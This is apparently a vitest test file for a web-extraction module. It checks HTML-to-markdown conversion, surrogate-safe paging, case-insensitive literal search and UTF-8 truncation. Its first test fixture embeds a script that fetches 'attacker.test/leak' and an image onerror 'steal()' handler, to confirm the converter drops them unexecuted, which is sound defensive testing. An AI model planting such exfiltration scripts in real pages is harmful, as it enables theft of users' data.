/**
 * Static HTML conversion, page slicing and literal location over a saved text.
 *
 * These helpers decide what the model can read: the conversion must never run
 * scripts or load subresources, a page must not split a surrogate pair or leave
 * a gap, and a case-insensitive search must report offsets in the *source* text
 * rather than in a lowercased copy. Each case therefore checks the text, the
 * actual boundaries and the reported coordinates together.
 *
 * @module dsh-nexus/test/web/extract
 */

import { describe, expect, it } from 'vitest'
import {
  FIND_MAX_MATCHES,
  FIND_SNIPPET_RADIUS,
  convertHtmlToText,
  findText,
  pageText,
  truncateToUtf8Bytes,
  utf8Bytes,
} from '../../src/web/extract.ts'

describe('convertHtmlToText', () => {
  it('converts visible HTML to markdown and drops non-visible elements without executing anything', () => {
    const html = [
      '<html><head>',
      '<script>fetch("https://attacker.test/leak")</script>',
      '<style>body{display:none}</style>',
      '</head><body>',
      '<h1>Title</h1>',
      '<p>Hello <strong>world</strong>.</p>',
      '<iframe src="https://frame.test/"></iframe>',
      '<img src="https://image.test/x.png" onerror="steal()">',
      '<div style="display:none">hidden text</div>',
      '<a href="https://example.test/doc">link</a>',
      '</body></html>',
    ].join('')

    const result = convertHtmlToText(html)

    expect(result.skipped).toBe(false)
    if (result.skipped) throw new Error('conversion unexpectedly skipped')
    expect(result.text).toContain('# Title')
    expect(result.text).toContain('Hello **world**.')
    expect(result.text).toContain('[link](https://example.test/doc)')
    expect(result.text).not.toContain('fetch(')
    expect(result.text).not.toContain('display:none')
    expect(result.text).not.toContain('hidden text')
    expect(result.text).not.toContain('steal()')
  })

  it('skips conversion for markup that nests past the safe conversion depth', () => {
    const html = `${'<div>'.repeat(900)}deep${'</div>'.repeat(900)}`

    const result = convertHtmlToText(html)

    expect(result).toMatchObject({ skipped: true, reason: 'too-deep' })
  })

  it('keeps ordinary partial markup convertible', () => {
    const result = convertHtmlToText('<p>unclosed <b>bold')

    expect(result.skipped).toBe(false)
    if (result.skipped) throw new Error('conversion unexpectedly skipped')
    expect(result.text).toContain('unclosed')
    expect(result.text).toContain('bold')
  })
})

describe('pageText', () => {
  it('returns the requested zero-based UTF-16 range and a continuing offset', () => {
    const page = pageText('abcdefghij', 2, 3)

    expect(page).toEqual({
      text: 'cde',
      offset: 2,
      endOffset: 5,
      nextOffset: 5,
      atEnd: false,
    })
  })

  it('reports the final page as the end without claiming more text', () => {
    const page = pageText('abcdefghij', 8, 10)

    expect(page).toMatchObject({ text: 'ij', offset: 8, endOffset: 10, nextOffset: 10, atEnd: true })
  })

  it('returns an empty end page when the offset equals the text length', () => {
    expect(pageText('abc', 3, 5)).toEqual({
      text: '',
      offset: 3,
      endOffset: 3,
      nextOffset: 3,
      atEnd: true,
    })
  })

  it('never splits a surrogate pair at the requested start or the page end', () => {
    const text = 'a😀b'

    const fromLowSurrogate = pageText(text, 2, 1)
    expect(fromLowSurrogate).toMatchObject({ text: '😀', offset: 1, endOffset: 3, nextOffset: 3, atEnd: false })

    const pairAtEnd = pageText('a😀', 2, 1)
    expect(pairAtEnd).toMatchObject({ text: '😀', offset: 1, endOffset: 3, nextOffset: 3, atEnd: true })
  })

  it('concatenates consecutive pages back into the exact saved text', () => {
    const text = `start 😀 ${'x'.repeat(40)} end`
    const pages: string[] = []
    let offset = 0
    for (;;) {
      const page = pageText(text, offset, 7)
      pages.push(page.text)
      offset = page.nextOffset
      if (page.atEnd) break
    }

    expect(pages.join('')).toBe(text)
  })
})

describe('findText', () => {
  it('reports literal match positions in the saved source text', () => {
    const text = 'ab😀ab'

    const outcome = findText(text, 'ab', true, FIND_MAX_MATCHES, FIND_SNIPPET_RADIUS)

    expect(outcome.truncated).toBe(false)
    expect(outcome.matches.map((match) => [match.offset, match.endOffset])).toEqual([
      [0, 2],
      [4, 6],
    ])
    const second = outcome.matches[1]
    if (second === undefined) throw new Error('missing second match')
    expect(second.snippet.slice(second.offset - second.snippetOffset, second.endOffset - second.snippetOffset)).toBe('ab')
  })

  it('treats the search text literally instead of as a pattern', () => {
    const outcome = findText('axb a.b', 'a.b', true, FIND_MAX_MATCHES, FIND_SNIPPET_RADIUS)

    expect(outcome.matches.map((match) => match.offset)).toEqual([4])
  })

  it('matches case-insensitively without lowercasing the source or shifting positions', () => {
    const text = 'İstanbul ABC abc'

    const insensitive = findText(text, 'abc', false, FIND_MAX_MATCHES, FIND_SNIPPET_RADIUS)
    expect(insensitive.matches.map((match) => match.offset)).toEqual([9, 13])
    expect(insensitive.matches.map((match) => text.slice(match.offset, match.endOffset))).toEqual(['ABC', 'abc'])

    const sensitive = findText(text, 'abc', true, FIND_MAX_MATCHES, FIND_SNIPPET_RADIUS)
    expect(sensitive.matches.map((match) => match.offset)).toEqual([13])
  })

  it('does not fold a dotted capital I onto an ASCII i', () => {
    const outcome = findText('İI', 'i', false, FIND_MAX_MATCHES, FIND_SNIPPET_RADIUS)

    expect(outcome.matches.map((match) => [match.offset, match.endOffset])).toEqual([[1, 2]])
  })

  it('bounds the number of reported matches and says more remain', () => {
    const text = 'x'.repeat(500)

    const outcome = findText(text, 'x', true, 20, FIND_SNIPPET_RADIUS)

    expect(outcome.matches).toHaveLength(20)
    expect(outcome.truncated).toBe(true)
    expect(outcome.scannedTo).toBe(20)
    expect(outcome.matches[19]?.offset).toBe(19)
  })

  it('keeps every snippet inside the source and bounded around the match', () => {
    const text = `${'a'.repeat(200)}TARGET${'b'.repeat(200)}`

    const outcome = findText(text, 'TARGET', true, FIND_MAX_MATCHES, 10)
    const match = outcome.matches[0]

    expect(match).toBeDefined()
    if (match === undefined) throw new Error('missing match')
    expect(match.snippetOffset).toBeGreaterThanOrEqual(0)
    expect(match.snippetOffset + match.snippet.length).toBeLessThanOrEqual(text.length)
    expect(text.slice(match.snippetOffset + (match.offset - match.snippetOffset), match.endOffset)).toBe('TARGET')
    expect(match.snippet.length).toBeLessThanOrEqual('TARGET'.length + 20)
  })

  it('reports no matches honestly', () => {
    expect(findText('nothing here', 'absent', false, FIND_MAX_MATCHES, FIND_SNIPPET_RADIUS)).toEqual({
      matches: [],
      truncated: false,
      scannedTo: 0,
    })
  })
})

describe('utf8 boundaries', () => {
  it('counts the saved UTF-8 bytes instead of code units', () => {
    expect(utf8Bytes('abc')).toBe(3)
    expect(utf8Bytes('中')).toBe(3)
    expect(utf8Bytes('😀')).toBe(4)
  })

  it('truncates to a UTF-8 byte budget on a code-point boundary', () => {
    const text = 'ab中😀cd'

    expect(truncateToUtf8Bytes(text, 100)).toBe(text)
    expect(truncateToUtf8Bytes(text, 3)).toBe('ab')
    expect(truncateToUtf8Bytes(text, 6)).toBe('ab中')
    expect(truncateToUtf8Bytes(text, 7)).toBe('ab中')
    expect(truncateToUtf8Bytes(text, 8)).toBe('ab中')
    expect(truncateToUtf8Bytes(text, 9)).toBe('ab中😀')
    expect(truncateToUtf8Bytes(text, 10)).toBe('ab中😀c')
  })

  it('never ends a truncated text with half a surrogate pair', () => {
    const truncated = truncateToUtf8Bytes('😀😀😀', 6)

    expect(truncated).toBe('😀')
    expect(truncated.charCodeAt(truncated.length - 1)).toBeGreaterThanOrEqual(0xdc00)
    expect(truncated.charCodeAt(truncated.length - 2)).toBeLessThanOrEqual(0xdfff)
  })
})
